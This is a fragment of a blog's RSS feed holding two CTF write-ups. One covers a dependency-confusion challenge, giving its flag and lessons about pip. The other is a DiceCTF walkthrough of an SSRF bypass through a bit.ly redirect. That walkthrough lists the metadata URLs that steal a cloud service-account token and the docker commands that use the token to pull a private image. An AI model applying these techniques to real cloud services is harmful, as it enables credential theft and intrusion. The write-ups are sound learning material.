+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is what we call &apos;Dependency confusion&apos;
+that is well explained here (this is not my article but I liked it) https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 .
+ Which is part of the Open Source Software Supply Chain Attacks.
+Flag: Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}
+We didn&apos;t want to make it more difficult to take in consideration what all the teams need as requirements. This is why for the time being we are not requesting difficult task (just read this file is enough) but the missconfiguration here is tied with the --extra-index-url. You can check the /etc/pip.conf if you are curious to see if this is a real task or was it faked.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;afterwords&quot;&gt;Afterwords&lt;/h2&gt;
+
+&lt;p&gt;It’s a really interesting challenge that shows using package managers could be a security risk if you are not aware of what you are doing. In the challenge, the loophole stems from the fact that the adminstrator thinks that &lt;strong&gt;only packages from the private repo&lt;/strong&gt; are installed, and puts unconditional trust in them; while in reality the misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip&lt;/code&gt; command searches from the &lt;strong&gt;public repo&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;For normal package manager users, there is also a take away: don’t install random packages from a repo because you think $``$pip/npm/apt has been installing right &amp;amp; secure packages for me$”$. In fact, when solving the challenge I received some requests called by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.py&lt;/code&gt; not from the server, but most probably from other ctf players. By doing so you could leak important credentials to malicious attackers. Fortunately they did not return any significant credentials, as I only tried commands like  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami / id&lt;/code&gt; as a PoC. You should also avoid running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pip&lt;/code&gt; from now on.&lt;/p&gt;
+</description>
+                <pubDate>Tue, 23 Mar 2021 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2021/03/23/SecurinetCTF2021-Hack-the-Empire.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2021/03/23/SecurinetCTF2021-Hack-the-Empire.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-misc</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>DiceCTF 2021 : Watermark as a Service</title>
+                <description>&lt;p&gt;I solved an interesting web challenge in Dice CTF 2021. There has been quite a lot of challenges related to cloud services recently, and it’s a good time to read more cloud API documentations…&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/dicegang/dicectf-2021-challs/tree/master/web/watermark-as-a-service&quot;&gt;Challenge Source&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SSRF with &lt;a href=&quot;https://bit.ly&quot;&gt;bit.ly&lt;/a&gt; bypass&lt;/li&gt;
+  &lt;li&gt;Google Cloud API Docker image leakage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;
+
+&lt;p&gt;The service running on &lt;a href=&quot;https://waas.dicec.tf&quot;&gt;waas.dicec.tf&lt;/a&gt; is a simple website snapshot app powered by puppeteer, a library for controlling a headless chrome. The source code has some protections to prevent the server from visiting the google metadata server. Our first step is to bypass the restrictions and visit it to collect credentials and metadata about the project on Google Cloud.&lt;/p&gt;
+
+&lt;h3 id=&quot;ssrf&quot;&gt;SSRF&lt;/h3&gt;
+
+&lt;p&gt;Using &lt;a href=&quot;https://en.wikipedia.org/wiki/IPv4#Address_representations&quot;&gt;dotless-decimal IP&lt;/a&gt; (For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.0.2.235&lt;/code&gt;  can be written as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://3221226219&lt;/code&gt;.) and &lt;a href=&quot;http://xip.io&quot;&gt;xip.io&lt;/a&gt; did not work because of the regex check and URL parser used in the source code. At last I managed to bypass the checking with &lt;a href=&quot;https://bit.ly&quot;&gt;bit.ly&lt;/a&gt;, a URL shortening service. Basically, &lt;a href=&quot;https://bit.ly&quot;&gt;bit.ly&lt;/a&gt; returns a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP 302 Found&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; Header, asking the client to go to the new location. With this trick, I was able to visit the metadata server.&lt;/p&gt;
+
+&lt;p&gt;Visiting  &lt;a href=&quot;http://metadata.google.internal/computeMetadata/v1/instance/&quot;&gt;http://metadata.google.internal/computeMetadata/v1/instance/&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;image-card width-wide caption&quot;&gt;
+  &lt;img src=&quot;/images/2021-02-08-DiceCTF2021-Watermark-as-a-Service/v1api.png&quot; alt=&quot;&quot; /&gt;
+  
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;google-cloud-api-leakage&quot;&gt;Google Cloud API Leakage&lt;/h3&gt;
+
+&lt;p&gt;Now that’s some progress! But according to the docs we would need a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metadata-Flavor: Google&lt;/code&gt; header in order to access the server. It seems impossible to inject a header after reviewing the nodejs code. Luckily, there is still a legacy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v1beta1&lt;/code&gt; api, and with that we could leak some very important infos:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;image-card width-wide caption&quot;&gt;
+  &lt;img src=&quot;/images/2021-02-08-DiceCTF2021-Watermark-as-a-Service/instance-recursive.png&quot; alt=&quot;&quot; /&gt;
+  
+&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;image-card width-wide caption&quot;&gt;
+  &lt;img src=&quot;/images/2021-02-08-DiceCTF2021-Watermark-as-a-Service/token.png&quot; alt=&quot;&quot; /&gt;
+  
+&lt;/figure&gt;
+
+&lt;p&gt;Summary:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;There is a docker image hosted on Google Cloud at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcr.io/dicegang-waas/waas&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;We have the token for Authorization.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;And that means we can pull the image from the Cloud with &lt;a href=&quot;https://cloud.google.com/container-registry/docs/advanced-authentication&quot;&gt;docker auth&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;To extract the token, I have used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tesseract-ocr&lt;/code&gt; to get a preliminary transcript of the token. It was able to recognize ~80% of the token accurately, but the rest had to be corrected by hand.&lt;/p&gt;
+
+&lt;p&gt;With the token, we can now pull the image:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker login &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; oauth2accesstoken &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;token&amp;gt;&quot;&lt;/span&gt; gcr.io
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker pull gcr.io/dicegang-waas/waas
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And by running the image we got the flag!&lt;/p&gt;
+
+&lt;figure class=&quot;image-card width-wide caption&quot;&gt;
+  &lt;img src=&quot;/images/2021-02-08-DiceCTF2021-Watermark-as-a-Service/flag.png&quot; alt=&quot;&quot; /&gt;
+  
+&lt;/figure&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dice{the_cloud_is_just_someone_elses_computer}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://cloud.google.com/compute/docs/storing-retrieving-metadata&quot;&gt;https://cloud.google.com/compute/docs/storing-retrieving-metadata&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://cloud.google.com/container-registry/docs/advanced-authentication&quot;&gt;https://cloud.google.com/container-registry/docs/advanced-authentication&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ctftime.org/writeup/24948&quot;&gt;tpc, Balsn CTF 2020&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+                <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2021/02/08/DiceCTF2021-Watermark-as-a-Service.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2021/02/08/DiceCTF2021-Watermark-as-a-Service.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-web</category>
+                
+                
+            </item>
+        
+    </channel>
+</rss>
